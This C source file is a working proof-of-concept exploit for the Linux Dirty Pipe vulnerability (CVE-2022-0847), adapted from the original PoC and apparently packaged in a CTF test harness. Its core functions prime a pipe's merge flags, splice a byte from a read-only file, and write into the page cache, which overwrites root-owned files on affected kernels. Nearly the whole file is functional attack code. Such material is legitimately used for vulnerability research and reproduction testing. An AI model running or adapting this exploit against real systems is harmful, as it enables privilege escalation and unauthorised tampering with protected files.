/**
 * CVE-2022-0847 PoC - Dirty Pipe (Page Cache Pollution via Pipe Buffer Flags)
 *
 * Vulnerability: pipe_buffer.flags not cleared after splice, leaving
 * PIPE_BUF_FLAG_CAN_MERGE set. Subsequent write() merges into the page cache
 * of a read-only file, enabling arbitrary file overwrite.
 *
 * Affected kernel: 5.8 ~ 5.16.11
 * Trigger: pipe() + fill + drain + splice(target_fd) + write(pipe)
 *
 * CTF mode: write_root_file (overwrite 0644 root-owned file via page cache)
 * Limitations:
 *   - Cannot write at page boundary (offset 0)
 *   - Cannot cross page boundary (max write = PAGE_SIZE - offset_in_page)
 *
 * Reference: https://dirtypipe.cm4all.com/
 * Original: Max Kellermann <max.kellermann@ionos.com>
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "../common/poc_common.h"

#define CVE_ID "CVE-2022-0847"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/* ========================================================================
 * Core exploit: prepare_pipe
 * Creates a pipe where all bufs have PIPE_BUF_FLAG_CAN_MERGE set.
 * Directly from the original PoC by Max Kellermann.
 * ======================================================================== */
static int prepare_pipe(int p[2]) {
    if (pipe(p)) {
        poc_log_syscall("pipe()", -1, errno);
        return -1;
    }
    poc_log_syscall("pipe()", 0, 0);

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    poc_log("Pipe size: %u bytes", pipe_size);

    static char buffer[4096];

    /* Fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* Drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    poc_log("Pipe prepared: filled + drained (PIPE_BUF_FLAG_CAN_MERGE set)");
    return 0;
}

/* ========================================================================
 * Core exploit: dirty_pipe_write
 * Overwrites file content at given offset via page cache pollution.
 *
 * Algorithm (from original PoC):
 *   1. Open target O_RDONLY
 *   2. Validate offset constraints (not on page boundary, no cross-page)
 *   3. prepare_pipe() to get CAN_MERGE flags
 *   4. splice 1 byte from (offset-1) into pipe — adds page ref without
 *      clearing PIPE_BUF_FLAG_CAN_MERGE
 *   5. write() to pipe — merges into the page cache (the overwrite!)
 * ======================================================================== */
static int dirty_pipe_write(const char *target_file, loff_t offset,
                            const char *data, size_t data_len) {
    int ret = -1;
    int saved_errno;

    /* Validate: offset cannot be on a page boundary */
    if (offset % PAGE_SIZE == 0) {
        poc_log("ERROR: Cannot write at page boundary (offset=%ld)", (long)offset);
        return -1;
    }

    /* Validate: write cannot cross a page boundary */
    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_len;
    if (end_offset > next_page) {
        poc_log("ERROR: Write crosses page boundary (end=%ld > next_page=%ld)",
                (long)end_offset, (long)next_page);
        return -1;
    }

    /* Open target file read-only (yes, read-only!) */
    int fd = open(target_file, O_RDONLY);
    saved_errno = errno;
    poc_log_syscall("open(target, O_RDONLY)", fd, saved_errno);
    if (fd < 0) {
        return -1;
    }

    /* Validate file size */
    struct stat st;
    if (fstat(fd, &st)) {
        poc_log_syscall("fstat(target)", -1, errno);
        close(fd);
        return -1;
    }

    if (offset > st.st_size) {
        poc_log("ERROR: Offset %ld beyond file size %ld", (long)offset, (long)st.st_size);
        close(fd);
        return -1;
    }
    if (end_offset > st.st_size) {
        poc_log("ERROR: Cannot enlarge file (end=%ld > size=%ld)",
                (long)end_offset, (long)st.st_size);
        close(fd);
        return -1;
    }

    /* Create pipe with PIPE_BUF_FLAG_CAN_MERGE set */
    int p[2];
    if (prepare_pipe(p) < 0) {
        close(fd);
        return -1;
    }

    /* Splice 1 byte from (offset-1) into the pipe.
     * This adds a reference to the page cache page, but since
     * copy_page_to_iter_pipe() does NOT initialize "flags",
     * PIPE_BUF_FLAG_CAN_MERGE remains set from prepare_pipe(). */
    loff_t splice_off = offset - 1;
    ssize_t nbytes = splice(fd, &splice_off, p[1], NULL, 1, 0);
    saved_errno = errno;
    poc_log_syscall("splice(target_fd, &offset-1, pipe[1], NULL, 1, 0)",
                    nbytes, saved_errno);
    if (nbytes <= 0) {
        poc_log("ERROR: splice failed or returned 0");
        goto cleanup;
    }

    /* The critical write: this will NOT create a new pipe_buffer, but
     * instead write into the page cache because PIPE_BUF_FLAG_CAN_MERGE
     * is still set. This is the Dirty Pipe bug! */
    nbytes = write(p[1], data, data_len);
    saved_errno = errno;
    poc_log_syscall("write(pipe[1], data, data_len)", nbytes, saved_errno);
    if (nbytes < 0) {
        poc_log("ERROR: write to pipe failed");
        goto cleanup;
    }
    if ((size_t)nbytes < data_len) {
        poc_log("WARN: short write (%zd < %zu)", nbytes, data_len);
        goto cleanup;
    }

    poc_log("Page cache overwrite successful: %zd bytes at offset %ld",
            nbytes, (long)offset);
    ret = 0;

cleanup:
    close(fd);
    close(p[0]);
    close(p[1]);
    return ret;
}

/* ========================================================================
 * CTF mode: write_root_file
 * Uses Dirty Pipe to overwrite root-owned file with CTF value.
 *
 * Flow:
 *   1. Read original content → CTF_READ_BEFORE
 *   2. Exploit: dirty_pipe_write(target, 1, write_value) → CTF_WRITE
 *   3. Read after → CTF_READ_AFTER
 *   4. Verify → CTF_FLAG or CTF_FAIL
 * ======================================================================== */
static int mode_write_root_file(const poc_args_t *args) {
    char buf[PAGE_SIZE] = {0};
    int fd;
    ssize_t n;
    int saved_errno;

    poc_log("=== write_root_file mode ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Step 1: Read original content (CTF_READ_BEFORE) */
    fd = open(args->root_file, O_RDONLY);
    saved_errno = errno;
    poc_log_syscall("open(root_file, O_RDONLY) [read-before]", fd, saved_errno);
    if (fd < 0) {
        poc_print_fail("Cannot open target file for read-before");
        return 1;
    }
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n < 0) {
        poc_print_fail("Cannot read target file");
        return 1;
    }
    buf[n] = '\0';

    /* Trim trailing whitespace/nulls for display */
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\0')) {
        buf[--n] = '\0';
    }
    printf("%s%s\n", CTF_READ_BEFORE, buf);
    poc_log("Read-before: %s", buf);

    /* Step 2: Exploit — overwrite via Dirty Pipe page cache pollution */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    poc_log("Attempting Dirty Pipe write at offset 1...");

    /* Write at offset 1 (cannot write at 0 = page boundary).
     * The file's first byte will remain unchanged, but the CTF value
     * written at offset 1 is sufficient for {} value extraction. */
    int ret = dirty_pipe_write(args->root_file, 1,
                               args->write_value, strlen(args->write_value));

    if (ret != 0) {
        poc_print_fail("Dirty Pipe exploitation failed - kernel may be patched");
        return 1;
    }

    /* Step 3: Read after exploitation (CTF_READ_AFTER)
     * NOTE: Do NOT call posix_fadvise(DONTNEED) or drop_caches!
     * Page cache pollution only exists in memory. */
    memset(buf, 0, sizeof(buf));
    fd = open(args->root_file, O_RDONLY);
    saved_errno = errno;
    poc_log_syscall("open(root_file, O_RDONLY) [read-after]", fd, saved_errno);
    if (fd < 0) {
        poc_print_fail("Cannot open target file for read-after");
        return 1;
    }
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n < 0) {
        poc_print_fail("Cannot read target file after exploit");
        return 1;
    }
    buf[n] = '\0';

    /* Trim for display */
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\0')) {
        buf[--n] = '\0';
    }
    printf("%s%s\n", CTF_READ_AFTER, buf);
    poc_log("Read-after: %s", buf);

    /* Step 4: Verify — check if write_value is present in file content.
     * We wrote at offset 1, so file = <byte0><write_value><tail>.
     * Use strstr for substring match (per CTF verification rules). */
    if (strstr(buf, args->write_value) != NULL) {
        poc_print_flag(args->write_value);
        poc_log("CTF PASSED: write_value found in file content");
        return 0;
    } else {
        poc_print_fail("Page cache not polluted - write_value not found in file");
        poc_log("CTF FAILED: file content does not contain write_value");
        return 1;
    }
}

/* ========================================================================
 * Main entry point — CTF CLI framework
 * ======================================================================== */
int main(int argc, char *argv[]) {
    poc_args_t args = {0};

    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);
    poc_log("=== %s Dirty Pipe CTF PoC ===", CVE_ID);
    poc_log("Mode: %s", args.mode);
    poc_log("Target: %s", args.root_file);
    if (args.write_value) {
        poc_log("Write value: %s", args.write_value);
    }

    int result;

    /* Mode dispatch */
    if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        /* Dirty Pipe cannot read files with 0400 permission.
         * It requires open(O_RDONLY) to splice, which needs at least
         * 'other' read permission. With 0400 (owner-only read),
         * nobody cannot open the file at all. */
        poc_print_unsupported(args.mode,
            "Dirty Pipe requires O_RDONLY access; 0400 blocks open for nobody");
        result = 1;
    } else {
        poc_print_unsupported(args.mode, "Only write_root_file is supported");
        result = 1;
    }

    poc_log_close();
    return result;
}
